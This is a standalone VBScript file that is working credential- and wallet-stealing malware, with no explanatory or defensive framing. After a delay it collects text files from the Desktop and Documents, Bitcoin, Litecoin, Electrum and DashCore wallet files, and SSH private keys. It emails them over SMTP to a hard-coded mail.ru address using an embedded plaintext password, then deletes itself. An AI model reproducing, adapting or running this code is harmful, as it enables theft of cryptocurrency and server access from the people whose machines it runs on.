on error resume next
Const Desktop = 4
Const MyDocuments = 16
Set S = CreateObject("Wscript.Shell") 

Set FSO = CreateObject("scripting.filesystemobject")
WScript.Sleep(1000 * 30)

strSMTP_Server = "smtp.mail.ru"
strTo = "shadowbyte1337@mail.ru"
strFrom = "shadowbyte1337@mail.ru"
strSubject = "AIRDROP"
strBody = "LOG"

Set iMsg=CreateObject("CDO.Message") 

Set iConf=CreateObject("CDO.Configuration")

Set wshShell = CreateObject( "WScript.Shell" )
strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )
Set Flds=iConf.Fields 
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")    = 2  
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl")      = true 
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "shadowbyte1337@mail.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword")    = "R4CMZ3rVnMFtzz6vzRi1" 

Flds.Update 
iMsg.Configuration=iConf 
iMsg.To=strTo 

iMsg.From=strFrom 
iMsg.Subject=strSubject 

iMsg.TextBody=strBody 
Set fld = FSO.GetFolder(S.SpecialFolders(Desktop))
For each file in fld.files
    if LCase(FSO.GetExtensionName(file)) = "txt" Then
        iMsg.AddAttachment file.path
	
    End if
Next

Flds.Update 
iMsg.Configuration=iConf 
iMsg.To=strTo 

iMsg.From=strFrom 
iMsg.Subject=strSubject 
iMsg.TextBody=strBody 

Set fld = FSO.GetFolder(S.SpecialFolders(MyDocuments))
For each file in fld.files
    if LCase(FSO.GetExtensionName(file)) = "txt" Then
        iMsg.AddAttachment file.path
	
    End if
Next

iMsg.AddAttachment "C:\Users\" & strUserName & "\AppData\Roaming\Bitcoin\wallet.dat"
iMsg.AddAttachment "C:\Users\" & strUserName & "\AppData\Roaming\Litecoin\wallet.dat"
iMsg.AddAttachment "C:\Users\" & strUserName & "\.ssh\id_rsa"
iMsg.AddAttachment "C:\Users\" & strUserName & "\AppData\Roaming\Electrum\wallets\default_wallet"
iMsg.AddAttachment "C:\Users\" & strUserName & "\.ssh\id_rsa.pub"
iMsg.AddAttachment "C:\Users\" & strUserName & "\AppData\Roaming\DashCore\wallet.dat"
iMsg.AddAttachment "C:\Users\" & strUserName & "\.ssh\known_hosts"
iMsg.Send

Set mFSO = CreateObject("Scripting.FileSystemObject")

Call mFSO.DeleteFile(WScript.ScriptFullName, True)